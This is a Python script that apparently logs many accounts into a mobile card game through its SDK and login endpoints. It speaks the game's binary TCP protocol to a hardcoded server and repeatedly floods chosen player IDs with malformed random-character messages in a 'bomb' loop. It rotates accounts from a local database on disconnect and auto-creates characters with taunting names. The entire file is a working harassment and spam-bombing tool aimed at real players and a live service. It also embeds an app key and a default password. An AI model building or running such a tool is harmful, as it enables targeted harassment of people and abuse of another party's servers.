#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import asyncio
import socket
import sqlite3
import json
import sys

import aiohttp
import requests

import socks
from lib import make_logon_data, get_proxies, del_proxy, make_send_msg_data, make_bad_msg_data, Session, init_data, make_create_role_data

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; U; Android 9.0.1; en-us;) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1"
}
# socket.socket = socks.socksocket

def get_proxies2():
    proxies = requests.get("https://proxy.ishield.cn/?types=0&count={}".format(300)).json()
    proxies += requests.get("https://proxy.ishield.cn/?types=1&count={}".format(300)).json()
    return set("{} {}".format(proxy[0], proxy[1]) for proxy in proxies)

async def user_do(username, imei, passwd='V0\/wJekk6Kk=', proxy=None):
    # return user_id and session for login_verify api
    version = 'Android1.0.1'
    tpl = '{"uid":"","token":"","uName":"%s","nickName":"","password":"%s","version":"%s","imei":"%s","authCode":"","flag":1,"isfast":"0","thirdType":1,"thirdToken":"","thirdUid":"","fbBusinessToken":"","language":"Cn","appKey":"76749c0621384a96b744ccb089567bcf"}'
    j = tpl % (username, passwd, version, imei)
    url = 'http://haiwaitest.3333.cn:8008/sdk/user/user.do'
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=j, headers=headers, proxy=proxy, timeout=3) as resp:
            t = await resp.text()
            r = json.loads(t)
            assert r["code"] == 100
    return r['uid'], r['token']

async def login_verify(user_id, token, version='1.6.61095', proxy=None):
    # return tcp session
    url = 'http://sgz-login.fingerfunol.com:30006/entry_server/login_verify?version=%s&server_id=20&userid=%s&channel=4&session=%s&platform=a8card&isdebug=False&activation_code=' % (version, user_id, token)
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers, proxy=proxy, timeout=5) as resp:
            t = await resp.text()
            r = json.loads(t)
    return r['session']

def char_gen():
    blocks = [15708544, 15708800, 15709056, 15709312]
    random.shuffle(blocks)
    char = random.randint(blocks[0], blocks[0] + 63).to_bytes(3, byteorder="big")
    return char

async def one(email, targets, wait=0):
    """maintance one bomb sender"""
    proxies = get_proxies()
    imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
    version = "1.6.61095"
    uid, token, session = None, None, None
    session_manager = Session(email)
    while True:
        print("start:", email)
        #random.shuffle(proxies)
        #host, port = proxies[0]
        #http_proxy = "http://{}:{}".format(host, port)
        http_proxy = None
        try:
            try:
                uid, token, session = session_manager.get_session(email)
                print("got session for", email)
                login_type = "from sqlite"
            except:
                if wait:
                    await asyncio.sleep(wait)
                    wait = 0
                uid, token = await user_do(email, imei)
                session_manager.update_session(email, uid, token, '')
                login_type = "from http"
            try:
                session = await login_verify(uid, token, version=version)
            except KeyError:
                uid, token = await user_do(email, imei)
                session_manager.update_session(email, uid, token, '')
                session = await login_verify(uid, token, version=version)

            fut = asyncio.open_connection('128.14.230.246', 30000)
            reader, writer = await asyncio.wait_for(fut, timeout=3)
            writer.write(make_logon_data(version, uid, imei, session))
            head = await reader.read(4)
            if head == b"":
                print("fail to connect with type:", login_type)
                session_manager.delete_session(email)
                continue
            body_len = int.from_bytes(head, byteorder="big")
            body = b""
            while len(body) < body_len:
                body += await reader.read(body_len - len(body))
            r = init_data(body)
            print(r)
            if not "name" in r:
                print("bug_email", email)
                name_pool = '幸段謝羊彬穆品狄琴芬丁墨鑫先耀嵇計岑昝樺熹忠賀才躍杜彪彭黃孟支良道房賓隗高博蔣吾石洋婁謙山婷龐談顏鋼慈明貝文超蔔尤愛紹伯全硯雅清昊翁楠袁戴壇元皓浩敏霖戎乾沙裘春柳雄應卞輝崗俊洪濱張苗雷龍顧凱魏危樊郎琰翰妍江中若葉繆吉合樂花祖何松傳邦糜慧迎梓邱執冉梁畢夏宣隆鵬思彰趙純止伶宋萬蘇洲竇莉涯毛坤鋒旭光竣巫璿曲義埃阮暉傑寧漩喻紫新晗雲非亞谷嫣範淦富雪午逸勝甄和童康也時辰鄒學翊翔卓之湛珂任川葛韶郝宇徐暴晨詹西琦宸董容濤燕伊啟烏磊許曆影陶勃宵蔡瑋皮米興貴費豪車健餘呂閃成弓枚薛晏芮芪汪常行季剛繼恬路祈單宝賁利錢荔彎群馮鄭強仇曉銳維熊瑞王凡訪伏殊紅疏世韋珺力捷戚胡紀河志諾生嵐賈蕭涔陳滑鈄駱蓬玉鐘馬劉項基珈與炎尹智靳境滕民朱稚筱昌靜衛伍向賽章解書諸姚仙陽唐姜秋豔子祁汲仰孔儲然盧久懿孫牧金田言培嶽多天煒舒霍羲大俞英奕君樹銘勇國曼軒鬱根刁卿潘酆湯郭虞錦臧禹偉建禮景盛嚴曹宮梅本龔茅倪籽峻羅莫宓壹森鳳威連廉奚安仲施藝鋮欒煜柏邢茂侯鄧淼傅褚雁席珮榮閔耶齊楊騰程絢惠林吳殷方泰竹海淵華堅裴呈希乙麻秦家遠班孜平符水祥粟焦聆鈞昕韓儀左藍振杭斌祝琅宏藤顯邴飛臻士昆夜'
                name_pool = list(name_pool)
                magic_pool = list('古月娜滾出二十區')
                models = [b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06']
                random.shuffle(name_pool)
                random.shuffle(models)
                random.shuffle(magic_pool)
                n = "".join(name_pool[:2]) + magic_pool[0] + "".join(name_pool[2:5])
                data = make_create_role_data(n, models[0])
                writer.write(data)
            chapter, section = r['story_index']
            if chapter == 1 and section == 1:
                writer.write(b'\x00\x00\x00\x07\x00\x04\x00\x00\x00\x00\x03')
            if chapter == 1 and section == 2:
                writer.write(b'\x00\x00\x00\x07\x00\x04\x00\x00\x00\x00\x06')
            writer.write(b'\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x07\x00\x01\x00\x00\x00\x00\x07')    # seems like 2 cmd, each len is 7, read on screen players?  00 00 00 00 00 00 05 an
            head = await reader.read(4)
            body_len = int.from_bytes(head, byteorder="big")
            body = b""
            while len(body) < body_len:
                body += await reader.read(body_len - len(body))
            writer.write(b'\x00\x00\x00\x02\x01\x00')  # heartbeat?
            await asyncio.sleep(3)
            #print("get body len", body_len, ":", body)
            #print("---------------do something----------------")
            #receiver = 353956
            i = 0
            print("bomb start------->>>>>>>")
            while True:
                random.shuffle(targets)
                for receiver in targets:
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 4))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 5))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 6))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 7))
                    writer.write(make_bad_msg_data(char_gen()*20, receiver, 8))
                    await asyncio.sleep(0.5)
                    i += 1
                    if i % 20 == 0:
                        writer.write(b'\x00\x00\x00\x02\x01\x00')
                    await reader.read(1024)
        except BrokenPipeError:
            import traceback
            print(traceback.format_exc())
            print(email, "disconnected after", i, "turns")
            conn = sqlite3.connect("data.db")
            conn.isolation_level = None   # auto commit
            c = conn.cursor()
            c.execute("SELECT email FROM guards ORDER BY RANDOM() LIMIT 1")
            email = c.fetchone()[0]
            print("change to:", email)
            await asyncio.sleep(random.randint(60,120))
            # session_manager.delete_session(email)
            # uid = token = session = None
        except:
            import traceback
            print("wtf!!!!", traceback.format_exc())
            session_manager.delete_session(email)
            await asyncio.sleep(random.randint(20,60))


async def count_down(sec):
    await asyncio.sleep(sec)
    exit()

if __name__ == "__main__":
    print(sys.argv)
    target_ids, seconds = sys.argv[1:]
    targets = list(map(int, target_ids.split(",")))
    seconds = int(seconds)
    print(targets, seconds)
    loop = asyncio.get_event_loop()
    guards = []
    conn = sqlite3.connect("data.db")
    conn.isolation_level = None   # auto commit
    c = conn.cursor()
    c.execute("SELECT * FROM guards ORDER BY RANDOM() LIMIT 20")
    idx = 0
    for row in c.fetchall():
        idx += 1
        guards.append(one(row[0], targets, int(idx/8)))
    loop.run_until_complete(asyncio.gather(*guards, count_down(seconds+40)))
    loop.close()
